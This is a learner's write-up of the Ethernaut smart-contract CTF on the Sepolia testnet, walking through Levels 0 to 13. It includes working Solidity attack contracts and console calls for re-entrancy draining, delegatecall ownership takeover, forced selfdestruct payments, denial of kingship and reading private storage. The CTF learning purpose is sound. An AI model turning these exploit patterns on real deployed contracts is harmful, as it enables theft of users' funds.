# Ethernaut docs
To help me get the most out of the Ethernaut CTF experience, I am writing up some documentation as I go. This is from the perspective of somebody who has some education about how blockchains work, but not much experience actually interfacing with them. Ethernaut was a great learning experience for me.

## Getting started: the absolute basics
While this is not intended as a comprehensive walkthrough, here are the things that were not obvious to me before I started this whole thing:
- The game is played in a test environment, but that environment is a real blockchain (Sepolia), you are interacting from a real wallet address, and using your "real" crypto "money" to execute transactions.
- This money is all in a test blockchain though, so you're not spending any "real money" to do this. You can't transfer value in or out of the Sepolia chain.
- You need the browser extension MetaMask to interface with the Sepolia chain via your browser. There are probably other ways to do this, but MetaMask is easy enough to use and no-commitment.
- In MetaMask, you will need to set up a new wallet address, and put some money in it. You can do this through a "faucet", which just gives you some (Sepolia-only) ETH. I got mine from [here](https://cloud.google.com/application/web3/faucet/ethereum/sepolia).
- A lot of the learning here, at least in the first handful of levels, is just figuring out how to interface with everything, often via the web3js console on the Ethernaut page, but also "externally" via things like RemixIDE.

## Level 0: Hello Ethernaut
This is just a tutorial level, which gets you to set up MetaMask, interact with basic functionality via the console, etc. At the end of the instructions you're asked to call the `.info()` method, which sends you on a trail of method calls which eventually gets you to call the `.authenticate()` method with the embedded password.

Once you have met the requirements the pass the level, you need to press "Submit Instance" on the ethernaut page to go to the next level.

## Level 1: Fallback
```
contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
At this point we see our first solidity code and start sending our first "real" transactions. We win the level by taking ownership of the contract and withdrawing all of the contract's balance.

The first thing I did here was read through the solidity code. It didn't take long to find the route to taking ownership.

### A note on retrieving values
You can retrieve the owner of this contract with `await contract.owner()` again, but not so with the `contributions` field. This is a mapping, and we can't just print out the whole mapping. This actually makes sense, as Solidity mappings don't keep track of the keys that have non-default values stored in them (at least not in a way that we can access). There is therefore no sensible way to print the "whole" mapping, as its inputs are the entire input domain - i.e. every possible address.

We can, however, call `await contract.contributions(player)`, which gives us a pretty ugly result. This seems to be an obect containing a serialised representation of a number, which must be due to size constraints in JavaScript's numeric literals. It took me a while to figure this out, but we can get the value we want with one of the following:
```
(await contract.contributions(player)).toNumber();
(await contract.contributions(player)).toString();
```
I haven't yet dealt with numbers too big for JavaScript, but I'm guessing there's a point at which `toNumber()` is no longer viable, and I'm hoping that `toString()` is able to represent those very large numbers in string form.

### A note on sending balance with a method call
The next challenge in the interface for me was actually sending ether with a method call. The approaches we have used so far to call these methods have not involved sending any ether, or at least not specifying how much ether we send. This turned out to be pretty simple, but very poorly documented - I think the advice in the CTF level wanted us to google the phrase "How to send ether when interacting with an ABI" perhaps. This still pointed me to stackexchange answers, which is not documentation.

In the end, I was able to contribute 0.0005 ether with the following:
```
contract.contribute({value:web3.utils.toWei("0.0005", "ether")});
```

There is also a `toWei()` function available in the global scope, but I opted for the above method as it was better (instrinsically) documented.

### Actually solving the level
So far we have just been playing with the interface, but the way to solve this level is clear from looking at the `receive()` method: you just need to have a non-zero contribution, and then send some more ether to be received by the `receive()` method. This will grant you ownership, and then you can do what you want.

> A lesson from this level: many methods are "payable", but if you send a payment to a contract with no method name, it falls back to the `receive()` method.

But the next thing is again an interface question: how do I send some ether to this contract without specifying a method? Turns out this was pretty simple too:
```
contract.send(web3.utils.toWei("0.0005", "ether"));
```

After this has gone through, we can see that we are now the owner by querying `await contract.owner()`. We have claimed ownership of the contract, we just need to reduce its balance to 0. This can be achieved with `contract.withdraw()` now that we are the owner. And that completes this level.

# Level 2: Fal1out
```
import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
This is a funny one. It's an error that seems too obvious to be real. There's just a typo in the name of the constructor of this contract, which means the constructor was never called. It also means we are able to call the "constructor" method any time we want, which will make us the owner.
```
contract.Fal1out();
await contract.owner();
```

I waited a minute for the original transaction to go through. I could see this had happened when the owner changed, although I'm sure there would be another way in this interface to see when a transaction has been confirmed. This was all that was needed to complete this level.

# Level 3: Coin Flip
```
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
Now we are given a contract intended to make you guess the outcome a 50/50 event, and get it right 10 times in a row. You can make a guess with `contract.flip(bool_guess)`, and you can see the number you have guessed correctly so far with `(await contract.consecutiveWins()).toNumber()`.

From inspecting the contract, we can see that they are using the hash of the current (unconfirmed) to determine the coin flip's result. At first it looked like a parity check, but I think they are checking if the hash is greater or less than the large value stored in `FACTOR`, via integer division. I am assuming that `FACTOR` is half of the max value of a hash. It doesn't actually matter the intention, what matters is that we can do the same computation to predict what the outcome will be.

Now, this may be possible from the developer console - I had a quick look, and I think it's doable if you're kinda fast enough and you have access to the same `blockhash` function, but I don't want to try to replicate hashing and integer division semantics in JavaScript. The CTF level suggests we start moving outside of this environment, and it makes sense to make an attack contract here.

I won't give a setup guide for Remix, but I opened it for the first time and had it running in 5 minutes. I just had to set the environment to `Injected Provider - MetaMask` for it to connect to the Sepolia chain and associate with my wallet address on that chain.

I wrote up the following contract:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract CrystalBall {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function makeGuess(address coinFlipAddress) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(coinFlipAddress).flip(side);
    }

}

interface CoinFlip {
  function consecutiveWins (  ) external view returns ( uint256 );
  function flip ( bool _guess ) external returns ( bool );
}
```

This just reproduces the logic to predict the guess, and calls the CTF contract to make the 'correct' guess. I don't bother to check that we are on a new block since the last guess, as calling too frequently will just cause a `revert`, which will cost me nothing except some gas fees.

The tricky part for a newcomer was figuring out how to call an external contract from within this contract, by address. It sounds like there are a few ways of doing this, but the `interface` method seems the safest and simplest. I manually wrote the interface myself the first time, but this didn't seem ideal, so instead I extracted the JSON ABI from the Ethernaut console with `JSON.stringify(contract.abi)`, which gave me the following:
```
[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"consecutiveWins","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view","constant":true,"signature":"0xe6f334d7"},{"type":"function","name":"flip","inputs":[{"name":"_guess","type":"bool","internalType":"bool"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable","signature":"0x1d263f67"}]
```

This is JSON though, and while there seems to be solidity libraries to import things like this, that seems complex. I'm not sure if there is a simpler method to get a solidity interface from the web3js contract, but I just pasted the above into an ABI/solidity translator [here](https://bia.is/tools/abi2solidity/), which spat out the interface you can see in the code above. All I had to do was change the interface name from `GeneratedInterface` to `CoinFlip`, which wasn't even strictly necessary.

Now I can compile and deploy this contract. There is a "Deploy" tab on the left bar in Remix. Make sure to select `CoinFlipper` instead of the `CoinFlip` interface when deploying. Once this is done, you should see an entry under "Deployed Contracts" with a big button called "makeGuess". Pressing this calls the associated method on our contract on-chain, which makes a (correct) coin flip guess on the CTF contract. After the block is confirmed, you can see this working back on the Ethernaut console with `(await contract.consecutiveWins()).toNumber()`.

> A lesson from this level: "random" is very difficult on most blockchains.

However, while pressing the button in Remix worked for me, I also wanted to know how to do this from the Ethernaut console. It turns out this is a bit tricky if you use web3js `Contract`s, but I'll show you the first way I got this working. First, I had to get the ABI and deployed address of my new `CoinFlipper` contract from Remix, which I used in the following on the Ethernaut console:
```
var flipperABI = [paste ABI here];
var flipperAddress = "[paste address here]";
var flipper = new web3.eth.Contract(flipperABI, flipperAddress);

// this saves you from specifying the 'from' address with each transaction
flipper.options.from = player;

await flipper.methods.makeGuess.call().send();
```
This is not quite as nice as the TruffleContract interface we have from Ethernaut's provided `contract`, but it's good enough for now.

We just need to make 10 correct guesses, either from the Remix interface or from the Ethernaut console, and then we have completed the level. Depending on how fast the network is mining new blocks, this might take a while though.

# Level 4: Telephone
Looking at the code, this is very similar to the previous level, except that all we have to do is make a call via a deployed contract, without needing to calculate any parameters. I quickly built the following contract, using a similar method as in Level 4:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level5 {
    address private telephoneAddress = [ethernaut's contract address here];

    function makeCall() external {
        Telephone(telephoneAddress).changeOwner(msg.sender);
    }
}

interface Telephone {
  function changeOwner ( address _owner ) external;
  function owner (  ) external view returns ( address );
}
```

It was a simple call to this deployed contract's `makeCall()` function that gave me ownership of the `Telephone` contract, completing the level.

> A lesson from this level: don't mix up `msg.sender` and `tx.origin`.


# Level 5: Token
A quick glance at the code doesn't show anything super out-of-place, but it was pretty simple to find the issue: integer underflow. And of course, you can see that the have specified Solidity version 0.6.0, as newer versions of the compiler take care of this sort of thing, afaik.

The comparison in `require(balances[msg.sender] - _value >= 0);` will always pass, as `_value` is unsigned, as is everything in `balances`. My first thought was just to send 30 tokens to myself, but this wouldn't work; it would subtract 30 tokens from my balance, resulting in me having a huge number of tokens (2^256-10, give or take off-by-one), but then that number would "increase" again by 30, causing it to *overflow* back to the original 20. The first thing I did was to deploy a contract to send some tokens to myself, but then I realised I didn't even need to do that. I just sent 30 tokens from myself to the address of one of my previously-deployed contracts.
```
contract.transfer("[address of deployed contract]", 30);
```
> A lesson from this level: integer overflow and underflow can break everything. Use a newer version of the Solidity compiler and/or SafeMath. Although there are still ways to cause under/overflow in the latest compiler version too.

Calling the above completed the level for me.

# Level 6: Delegation
First glance of this contract shows me `delegatecall`, which is super interesting. Since you can't update contracts once they are deployed, it's common for contracts to simply be shells that point to implementations elsewhere, and `delegatecall` allows for method calls to be forwarded from contract A to contract B, such that contract B's code executes *on contract A's memory*. That last part is important.

So, if we can get the `Delegation` contract to make a `delegatecall` to the `Delegate` contract's `pwn` function, then it will set `owner` to us, but that `owner` will be pointing back to the memory of `Delegation`, et voila, we will be the new owners.

> A lesson from this level: `delegatecall` can be dangerous. Use it carefully.

However, now we are dealing with some more low-level transaction crafting, and it'll take a bit of learning to figure out how to make the right transaction request here.

Firstly, we will need the method ID for the `pwn()` method. This is just the first 4 bytes of the keccak256 hash of the string representing the method signature. For `pwn()`, that is `dd365b8b`, which I got from [here](https://emn178.github.io/online-tools/keccak_256.html). If we wanted to also send some parameters with our transaction, that would get a bit more complex, but luckily `pwn()` takes no parameters.

In the end it was a very simple invocation in the Ethernaut console that gave me the result I wanted:
```
sendTransaction({to:contract.address, from:player, data:"dd365b8b"});
```
It seems that web3js etc took care of all the other details, such as gas price, gas allocation, etc. I'm glad I didn't need to dive into all of those details myself.

# Level 7: Force
This is another strange one. We are faced with a contract that has no payable methods and no fallbacks defined. It turns out some contracts really don't want to receive any payments, but there is a tricky way to force a payment on somebody: a contract can self-destruct, and when this happens it sends its entire balance to an address. That address is forced to receive the balance.

It's a bit weird that `selfdestruct()` exists - it looks like there's some interesting history behind it. Nevertheless, it does exist and it's a way to force payment to an address that doesn't have payment fallbacks. I built the following contract that can receive payment and immediately self-destruct, sending its balance to a supplied address.
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level7 {
    function boom(address payable beneficiary) payable external {
      selfdestruct(payable(address(beneficiary)));
    }
}
```

After deploying this, I created a web3js contract similarly to in previous levels, and then called the `boom()` method with the level contract's address, along with some ether for it to then disperse on self-destruction, using the following invocation:
```
con.methods.boom(contract.address).send({value:web3.utils.toWei("0.0001", "ether")})
```
This completed the level.

# Level 8: Vault

Here, we can unlock the vault if we know the password. The `password` field is private, but of course everything on a blockchain is public, so of course that's going to be stored somewhere.

My first thought was that the password would be encoded on the transaction that called the constructor and created the contract. But then it occurred to me that it will just be in the contract's state, and that is probably easier to find (although both are public). This still took a bit of looking around - I thought I'd find the data I needed more quickly on etherscan etc, but in the end there is a simple web3js method that gets me what I need.
```
await web3.eth.getStorageAt(contract.address, 0)
-> 0x0000000000000000000000000000000000000000000000000000000000000001
```

The above gave me the first 32 bytes of storage, and looks suspiciously like a boolean `true`. This makes sense as the first part of storage, as the boolean variable `locked` is declared before `password`. The next entry is:

```
await web3.eth.getStorageAt(contract.address, 1)
-> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

This is some raw binary data. My first thought was that I'd need to decode this somehow, but the type of `password` is just `bytes32`, so I was able to complete the level with the following invocation:

```
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");
```

> A lesson from this level: eveything on-chain is public. This is why zero-knowledge proofs are so important in blockchain work.

# Level 9: King
The goal here is to prevent the Ethernaut level from becoming 'king' again, after you submit the level. It doesn't say that you have to be king yourself. This took me a minute to see, but I think the trick is to make the king an address that isn't payable. Then, when the Ethernaut level tries to reclaim kinghood, `receive()` will fail when it tries to send the balance back, and revert, making the unpayable king unusurpable.

> A lesson from this level: don't assume all addresses are payable.

I don't think I can make my own wallet unpayable, but I didn't look into it, as I can just make an unpayable contract, then make that contract king, and then we are golden. You can't give a contract any balance during contract creation though, so I'll need to make the contract somewhat payable, I'll just have to make it so that the Ethernaut level fails when it tries to pay it back.

I implemented a solution this way, but I came across something while I was working on it that I want to use to break the level instead. It's a subtle difference: instead of making the king unpayable, I will make it so the king can't be paid via the `transfer()` method. This method only allocates 2300 gas for the fallback method to use, so if we exceed this amount, it will fail and revert. I think the way the Ethernaut devs built the original `King` contract was to intentionally drop us into the same trap, which was clever.

At this point I also got sick of defining contracts in the Ethernaut console, so i built a couple of helpers:
```
var makeContract = (addr, abi) => { var con = new web3.eth.Contract(abi, addr); con.options.from=player; return con; };

var wei = x => web3.utils.toWei(x, "ether");
```

So I built the following contract, which can not receive funds via `transfer()`. I could have just written a loop or something to burn the 2300 wei, but I figured that calling the `transfer()` method itself will of course burn more than 2300 wei, so that should do the trick. I suppose if this wasn't going to run out of gas this would become some kind of reentrancy problem, but that's a topic for the next level I think.
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract ForeverKing {
    function usurp(address payable kingGame) payable external {
        payable(kingGame).call{value: address(this).balance}("");
    }

    receive() external payable {
        payable(msg.sender).transfer(msg.value);
    }
}
```
I deployed the above contract and invoked it with the following, which completed the level.
```
await con.methods.usurp(contract.address).send({value:wei("0.0015")})
```

# Level 10: Re-entrancy

This is a famous vulnerability. The code provided here allows you to `withdraw()` some balance, but it sends the balance with the `call()` method, which doesn't have a strict gas limit (as it did the previous level). In this case, this allows me to call `withdraw()` again from the `receive()` method, and since the level contract doesnt perform bookkeeping until after the transfer, we are able to withdraw balance as many times as we like (or at least until we run out of gas).

I built and deployed the following contract, and then executed the exploit with the following invocation:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level10 {
    address private victim;
    uint256 private withdrawAmount;
    function attack(address victimAddress) payable external {
        victim = victimAddress;
        withdrawAmount = msg.value;
        Reentrance(victim).donate{value:msg.value}(address(this));
        Reentrance(victim).withdraw(withdrawAmount);
    }

    receive() external payable {
        Reentrance(victim).withdraw(withdrawAmount);
    }
}

interface Reentrance {
  function balanceOf ( address _who ) external view returns ( uint256 balance );
  function balances ( address ) external view returns ( uint256 );
  function donate ( address _to ) external payable;
  function withdraw ( uint256 _amount ) external;
}
```
```
con.methods.attack(contract.address).send({value:toWei("0.0005")});
```

The target contract started off with 0.001 ether, so I just needed to start this process with a number that will multiply into 0.001. 0.001 would have already been enough, but I used 0.0005 just to give my exploit a chance to stretch its legs. This worked, and completed the level.

> A lesson from this level: Transferring balance to contracts is dangerous, whether you use a limited-gas method or an unlimited-gas method.

Something to note here is that `revert()` doesn't "bubble up" through a `call()` invocation. This is why I didn't have to be careful with terminating my re-entrancy loop the right way. At some point I would call `withdraw()` and it would fail and revert, but this wouldn't revert all of my sneaky work up to that point, just the execution of the deepest (failing) `withdraw()`.

# Level 11: Elevator

At first glance, I think this is going to be about the `pure` method modifier. We need to implement an interface, and we can break the assumptions of the victim contract if we implement a method impurely, because the victim contract assumes the method to be pure. In this sense, I use "pure" to mean that the same input will always produce the same output. In Solidity, `view` would also give the desired effect here, but `pure` is an even stronger property.

> A lesson from this level: don't make assumptions about methods implemented in other contracts: "in an investigation, assumptions kill". Be as precise as you can with method modifiers.

I deployed the following contract and invoked its `getToTopFloor()` method with the victim contract's address, and this completed the level.

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract ImpureBuilding {
    bool private sayNoOnce = true;
    function isLastFloor(uint256) external returns (bool) {
        if (sayNoOnce) {
            sayNoOnce = false;
            return false;
        }
        return true;
    }

    function getToTopFloor(address elevator) external {
        Elevator(elevator).goTo(1);
    }
}

interface Elevator {
  function goTo ( uint256 _floor ) external;
}
```

# Level 12: Privacy
```
contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
This level seems almost identical to "Vault". There is a private variable in the contract's state, and we need that value to unlock the contract and pass the level. The only difference here is that the data is slightly less obviously placed.

The password is in `data[2]`. Instead of trying to calculate where I expect that piece of data to live in storage, I just printed the first handful of pages (is "page" the right term?) in the contract's storage to inspect them. What I got was:
```
await web3.eth.getStorageAt(contract.address, [index]); 
[0]: 0x0000000000000000000000000000000000000000000000000000000000000001
[1]: 0x0000000000000000000000000000000000000000000000000000000067cc2b64
[2]: 0x000000000000000000000000000000000000000000000000000000002b64ff0a
[3]: 0x43b3ddb218d1f4f2070643816f15c9814c2b105dc9648a459c02ba97627b44c7
[4]: 0xf98f451e75dd214bbd77286a0d6925ffe6bb76431e1e679f8d3b099dc8c09566
[5]: 0xa341432f16b3bf30d347d6b6a3261b4a05b3c073ebb4b1eca9b0e5481d04435b
```

Matching this to contract's declared variables in the same order, we can see that page 0 is 32 whole byes representing the boolean `true`, similar to what we could see in the "Vault" level. Page 1 looks like it's all just `timestamp`. The next three state variables are of type `uint8` and `uint16`, which respectively take up 8 and 16 *bits*, so these seem packed into the same 32 byte page, and we can recognise the values 10 and 255 as `0a` and `ff` at the "start" (last digits) of the page. So, the three values in `data` must be pages 3, 4, and 5. So `data[2]` is page 5.

However, that's not the end of the story, there's a casting that happens before the comparison. `data[2]` is a `bytes32`, bit it is cast into `bytes16` and then compared to `_key`. Without looking it up, I'm going to try both halves of the page and see which one unlocks the contract. Turns out it's the left-hand bits, so the following unlocked the contract and completed the level.
```
contract.unlock("0xa341432f16b3bf30d347d6b6a3261b4a");
```

# Level 13: Gatekeeper One
```
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

It looks like there are three gates to get through.
- Gate One just requires us to pass this request through a deployed contract.
- Gate Two requires a specific amount of gas to be left at the point of checking.
- Gate Three requires us to pass in a key that appears to be some data derived from the player's address.

My main concern here is how to assign just the right amount of gas such that `gasleft()` gives the right value when it is called. I think I could either try to predict this through examining the amount of gas used by everything leading up to that call, or I could just deploy the contract and step through it to see what happens.

At first I did the latter; I deployed my own copy of the contract and debugged it at the bytecode level, figuring out exactly how much gas had been used by the time `gasleft()` was called, and reverse-engineering the right amount of gas to allocate to pass the second gate. However, it turns out that while this worked on my personal deployment of the contract, it didn't on the live contract. I wasn't able to "verify" (I don't like the use of that word in this context) the bytecode of the deployed contract, so I couldn't do too good a job of debugging it. I would have been content to step manyally through the bytecode of the contract and examine the amount of gas left when the `GAS` opcode executes, but after a deep-dive into debugging (including learning to use Tenderly and Foundry, running my own local fork to debug locally as well as in Remix), I found that tooling is very lacking when it comes to stepping through the bytecode of a cross-contract call.

This is something I still want to tackle at some point, but eventually I thought I'd look up others' solutions to this level to see if I had missed something, and realised that others were just brute-forcing the solution (including the official solution). So, even though I wanted to solve this a bit more elegantly, I decided to brute-force too.


My first call I allocated 1000000 gas to the transaction (which of course failed). Using Remix to debug this transaction, I was able to trace the execution through to the `GAS` opcode, and see that before executing that instruction there was 999586 gas remaining. I looked up the EVM opcode and can see that this returns the amount of gas remaining, after spending the 2 gas needed to execute that instruction. Indeed, I could see that after this instruction, the top of the stack contained `f40a0`, which is 999584 in decimal, so this makes sense.

Given that I started with 1000000 gas, it seems that this algorithm uses 416 gas by the time it has executed the `GAS` operation. So I next ran the same transaction with 8191*100+416 = 819516 gas. Actually I decided that a better opcode to watch was `MOD` when debugging. This time, I stepped to that point and took a look at the stack, which contained `c7f9c` (819100) and `1fff` (8191). After the `MOD` operation, the top of the stack is zero, which is exactly the outcome we wanted.

Next we need to figure out how to pass the third gate. The parameter `_gateKey` is of type `bytes8`, which takes up 64 bits. There are three checks against this key, which seem to compare various sections of bits in the data.

The first part casts both sides to `uint64`, then one side to `uint32` and the other `uint16`. If we assume that these casts take the lower bits in all cases, this condition would probably be asserting that bits 16-31 are zeroes in the input key. Setting the input to all zeroes got us past the first hurdle.

The next part asserts inequality between the 32 bit casting and the full 64 bits. This would mean that the higher 32 bits can't be entirely zeros. Making the first hex character of the input an `f` got us past the second hurdle.

The third part seems to require some part of the key to matxh `tx.origin`, which is the player's address. The left-hand side seems to ask for the lower 32 bits of the key, and the right-hand side seems to be asking for the lower 16 bits. So I made the final four characters of the input key the final four characters of my wallet address.

This worked for the copy of the contract that I had deployed, including when I switched over to the real testnet and again deployed a copy of the contract. However, I wasn't getting the same result when trying to infiltrate the real contract. Remix in theory will let you step through bytecode to debug, but it was bugging out, which seems to be a known issue. It makes sense that a small compiler version would change little things like the exact amount of gas used, as well as some compiler settings, and I don't have access to the compiler settings used to compile the Ethernaut level.

On one hand, this issue is a good representation of a real situation you might be in, outside of a CTF game. On the other hand, the ability to step through the execution of a real transaction at the bytecode level seems like something we really should have, and it's disappointing that I can't seem to find any tool apart from Remix that offers this functionality.

Tenderly will let you debug solidity code, but the debugging accuracy is not fine enough to examine mid-expression computations. I'm sure there are lots of cases where this level of detail is perfect, but I'm frustrated that there's no option to dive deeper into the debug.